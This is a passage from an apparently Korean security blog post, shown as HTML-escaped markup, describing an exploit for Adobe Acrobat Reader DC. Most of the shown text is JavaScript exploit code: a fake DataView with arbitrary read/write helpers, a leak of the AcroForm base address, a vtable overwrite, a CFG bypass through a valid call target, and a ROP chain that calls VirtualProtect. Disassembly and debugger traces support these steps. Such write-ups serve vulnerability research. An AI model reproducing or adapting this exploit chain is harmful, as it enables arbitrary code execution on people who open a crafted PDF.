&amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; targetDV = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;DataView&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x64&lt;/span&gt;));
targetDV.setUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x55555555&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV_START = &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
&lt;span class=&#34;hljs-comment&#34;&gt;//....&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; targetDVPtr = addrOf(targetDV);
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] target dataview address: &amp;quot;&lt;/span&gt; + targetDVPtr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; k++) {
    corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AAR&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr&lt;/span&gt;) &lt;/span&gt;{
    corruptedTypedArr[FAKE_DV_START + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;].getUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AAW&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr, value&lt;/span&gt;) &lt;/span&gt;{
    corruptedTypedArr[FAKE_DV_START + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;] = addr;
    modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;].setUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, value, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;addrOf&lt;/code&gt;&amp;#xB85C; &amp;#xC6D0;&amp;#xBCF8; &lt;code&gt;DataView&lt;/code&gt;&amp;#xC778; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;(&lt;code&gt;targetDVptr&lt;/code&gt;)&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xC6D0;&amp;#xBCF8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;poi&lt;/code&gt;&amp;#xB85C; &amp;#xC77D;&amp;#xC5B4; &lt;code&gt;corruptedTypedArr[FAKE_DV_START]&lt;/code&gt;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC81C;&amp;#xD558;&amp;#xC5EC; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C; &amp;#xC758;&amp;#xB3C4;&amp;#xCE58; &amp;#xC54A;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;corruptedTypedArr[FAKE_DV_START + 20]&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;DataView&lt;/code&gt;&amp;#xC758; &lt;code&gt;ArrayBuffer&lt;/code&gt; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xAC70;&amp;#xB098; &amp;#xC4F8; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;modifiedArr[2]&lt;/code&gt;&amp;#xB85C; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;setUint32&lt;/code&gt;&amp;#xB098; &lt;code&gt;getUint32&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xAC70;&amp;#xB098; &amp;#xC4F0;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;5-Insert-ROP-Payload&#34;&gt;&lt;a href=&#34;#5-Insert-ROP-Payload&#34; class=&#34;headerlink&#34; title=&#34;5. Insert ROP Payload&#34;&gt;&lt;/a&gt;5. Insert ROP Payload&lt;/h2&gt;&lt;p&gt;&lt;code&gt;addrOf&lt;/code&gt;, &lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xC8FC;&amp;#xC18C; &amp;#xB4F1; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACE0; vtable&amp;#xC744; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &amp;#xC0BD;&amp;#xC785;&amp;#xD55C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB3C4;&amp;#xB85D; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Leak-AcroForm-Base-Address&#34;&gt;&lt;a href=&#34;#Leak-AcroForm-Base-Address&#34; class=&#34;headerlink&#34; title=&#34;Leak AcroForm Base Address&#34;&gt;&lt;/a&gt;Leak AcroForm Base Address&lt;/h3&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;AAR&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;textField&lt;/code&gt;&amp;#xC778; &lt;code&gt;f0&lt;/code&gt;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;AcroForm.API&lt;/code&gt;&amp;#xC758; &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &lt;code&gt;field&lt;/code&gt;&amp;#xC758; vtable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xB54C;&amp;#xC640; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xB85C; vtable&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC774; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; 0x20000158(&lt;code&gt;arrBufPtr + 0x100&lt;/code&gt;)&amp;#xC5D0; &amp;#xBCF5;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; arrBufPtr = &lt;span class=&#34;hljs-number&#34;&gt;0x20000048&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; AcroFormApiBase =
    AAR(AAR(addrOf(f0) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0x34&lt;/span&gt;) - VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;AcroFormOffset&amp;quot;&lt;/span&gt;];
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] AcroForm base leaked: &amp;quot;&lt;/span&gt; + AcroFormApiBase.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; fieldVtbl = AAR(fieldVtblAddr);

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(
    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] field vTable Addr: &amp;quot;&lt;/span&gt; +
        fieldVtblAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) +
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; | fieldVtable: &amp;quot;&lt;/span&gt; +
        fieldVtbl.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
);
&lt;span class=&#34;hljs-string&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;``&lt;/span&gt;
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] clone field vtable for overwriting defaultValue pointer&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, AAR(fieldVtbl + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; originalDefaulValFunc = AAR(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Building-ROP-Chain-CFG-Bypass&#34;&gt;&lt;a href=&#34;#Building-ROP-Chain-CFG-Bypass&#34; class=&#34;headerlink&#34; title=&#34;Building ROP Chain : CFG Bypass&#34;&gt;&lt;/a&gt;Building ROP Chain : CFG Bypass&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;ROP = VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ROP&amp;quot;&lt;/span&gt;];
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// ROP_s = AcroForm!sub_20EFAA60 ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// xchg eax, esp ; ret ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// pop esp ; ret ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;// pivot to our _stack&lt;/span&gt;
AAW(fieldVtblAddr, arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;// overwrite field vtable to our ROP start&lt;/span&gt;

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] storing recovery context!&amp;quot;&lt;/span&gt;);
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, fieldVtblAddr); &lt;span class=&#34;hljs-comment&#34;&gt;// original vtable ptr (goes back in ecx)&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x64&lt;/span&gt;, fieldVtbl); &lt;span class=&#34;hljs-comment&#34;&gt;// vtable funcs ptr&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;, originalDefaulValFunc); &lt;span class=&#34;hljs-comment&#34;&gt;// original defaultVal impl to jump to&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x6c&lt;/span&gt;, AAR(ARR_BUF_BASE + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)); &lt;span class=&#34;hljs-comment&#34;&gt;// corrupted arrbuf typed array ptr&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;, AAR(ARR_BUF_MALLOC_BASE)); &lt;span class=&#34;hljs-comment&#34;&gt;// malloc header 0&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x74&lt;/span&gt;, AAR(ARR_BUF_MALLOC_BASE + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)); &lt;span class=&#34;hljs-comment&#34;&gt;// malloc header 1&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; rop = [
    AAR(AcroFormApiBase + VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;VirtualProtect&amp;quot;&lt;/span&gt;]), &lt;span class=&#34;hljs-comment&#34;&gt;// VirtualProtect&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// return address&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// sz&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// new protect&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x540&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// old protect&lt;/span&gt;
];

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; rop.length; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; * i, rop[i]);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xBCF5;&amp;#xC81C;&amp;#xB41C; vtable&amp;#xC5D0; ROP &amp;#xAC00;&amp;#xC82F; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xACE0; &lt;code&gt;textField&lt;/code&gt;&amp;#xC778; &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; vtable &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; Fake vtable&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;f0.defaultValue&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; &lt;code&gt;vtable + 0x48&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;defaultValue&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xB370; Fake vtable&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;.text:20EFAA60 sub_20EFAA60    proc near               
.text:20EFAA60                                         
.text:20EFAA60                 mov     eax, [ecx]
.text:20EFAA62                 push    0Dh
.text:20EFAA64                 call    dword ptr [eax+30h]
.text:20EFAA67                 retn
.text:20EFAA67 sub_20EFAA60    endp&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Adobe Acrobat Reader DC&amp;#xB294; CFG(Control Flow Guard)&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; vtable&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xAC00;&amp;#xC0C1; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC774;&amp;#xB098; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xD638;&amp;#xCD9C; &amp;#xB4F1;&amp;#xC758; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xB54C; &lt;code&gt;__guard_check_icall_fptr&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xADF8;&amp;#xB807;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xAC15;&amp;#xC81C; &amp;#xC885;&amp;#xB8CC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; vtable&amp;#xC5D0; &amp;#xC9C1;&amp;#xC811; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xBA74; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;AXTEFontAccess::&lt;/code&gt;vftable&amp;#x2019;&lt;code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC04;&amp;#xC811;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xACE0; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; RVA &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C;&lt;/code&gt;__guard_fids_table`&amp;#xC5D0;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;.rdata:211315C0 ; const AXTEFontAccess::`vftable&amp;apos;
.rdata:211315C0 ??_7AXTEFontAccess@@6B@ dd offset sub_20DFFBE0
.rdata:211315C0                                         ; DATA XREF: sub_20DFF7B6+21&amp;#x2191;o
.rdata:211315C0                                         ; sub_20DFFAAA+6&amp;#x2191;o
                                       ....
.rdata:21131674                 dd offset sub_20EFAA60
                                       ....&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC758; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xACE0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=0be950e0 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a3b &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200202
AcroForm!hb_ot_tags_to_script_and_language+0x68f9b:
63a89a3b ff153ca9fc63    call    dword ptr [AcroForm!DllUnregisterServer+0x50e8dc (63fca93c)] ds:002b:63fca93c={ntdll!LdrpValidateUserCallTarget (777c88e0)}
0:000&amp;gt; p
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a41 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
